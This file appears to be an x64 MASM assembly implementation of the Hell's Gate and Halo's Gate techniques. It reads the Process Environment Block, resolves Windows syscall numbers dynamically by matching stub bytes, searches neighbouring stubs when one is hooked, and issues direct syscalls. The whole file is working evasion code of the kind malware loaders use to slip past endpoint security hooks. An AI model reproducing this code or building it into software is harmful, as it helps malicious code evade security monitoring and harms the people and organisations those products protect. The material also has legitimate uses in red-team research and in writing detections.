
comment $
	Author	=> Abdallah Mohamed
	Date	=> 4-3-2023/09:29PM
$


.data

; will store the syscall number to use with HellDescent procedure
wSysCallNumber DW ?


.code

; Get Process Environment Block
GetPEB proc
	; Read G Segment register which contains PEB and also TEB 
	mov rax, qword ptr gs:[60h]
	ret
GetPEB endp

; For return 0 if the syscall was hooked
HookedSyscall proc
	; return 0
	mov rax, 0
	ret
HookedSyscall endp

; Grab syscall number dynamically
HellsGateGrabber proc
	comment $
		every syscall starts with the following instrucions
			; mov r10, rcx
            ; mov eax, <SyscallNumber> <-- We need to resolve this number
	$

	; syscall pattern
	mov esi, 0b8d18b4ch

	; move the syscall content into edi 
	mov edi, [rcx]

	; Check if hooked or not
	cmp esi, edi

	; return 0 if hooked
	jne HookedSyscall

	; Clear accumlator 
	xor rax, rax

	; Grab the syscall number
	mov ax, [rcx + 4]

	; the end of the procedure
	ret
HellsGateGrabber endp

; Prepare the syscall
HellsGate proc
	; Read syscall number as a parameter and store it in the memory
	mov wSysCallNumber, cx
	ret
HellsGate endp

; Call the specified syscall
HellDescent proc
	; Move args into r10 register which used by the syscall
	mov r10, rcx

	; Specify the syscall number
	mov eax, dword ptr wSysCallNumber

	syscall
	ret
HellDescent endp

; Try to resolve syscall from neighbors
HaloGateDown proc
	; syscall size
	mov rax, 20h

	; Clear rbx register
	xor rbx, rbx

	; Save dx in bx to use it later, because mul instruction will destroy dx
	mov bx, dx

	; multiply size of syscall by the index of neighbors
	mul dx

	; go down
	add rcx, rax

	; move the neighbor syscall content into edi 
	mov edi, [rcx]

	comment $
		every syscall starts with the following instructions
			; mov r10, rcx
            ; mov eax,

		the b8d18b4ch value is the machine code of these instruction,
		let's move it to esi register to compare it with the neighbor syscall
	$
	mov esi, 0b8d18b4ch

	comment $
		Check if the neighbor syscall starts with
			; mov r10, rcx
            ; mov eax,
	$
	cmp esi, edi

	; if hooked return 0
	jne HookedSyscall

	xor rax,rax

	; return the syscall number
	mov ax, [rcx + 4]
	sub ax, bx
	ret
HaloGateDown endp

; Try to resolve syscall from neighbors
HaloGateUp proc
	; syscall size
	mov rax, 20h

	; Clear rbx register
	xor rbx, rbx

	; Save dx in bx to use it later, because mul instruction will destroy dx
	mov bx, dx

	; multiply size of syscall by the index of neighbors
	mul dx

	; go up
	sub rcx, rax

	; move the neighbor syscall content into edi 
	mov edi, [rcx]

	comment $
		every syscall starts with the following instructions
			; mov r10, rcx
            ; mov eax,

		the b8d18b4ch value is the machine code of these instruction,
		let's move it to esi register to compare it with the neighbor syscall
	$
	mov esi, 0b8d18b4ch

	comment $
		Check if the neighbor syscall starts with
			; mov r10, rcx
            ; mov eax,
	$
	cmp esi, edi

	; if hooked return 0
	jne HookedSyscall

	xor rax,rax

	; return the syscall number
	mov ax, [rcx + 4]
	add ax, bx
	ret
HaloGateUp endp
	
end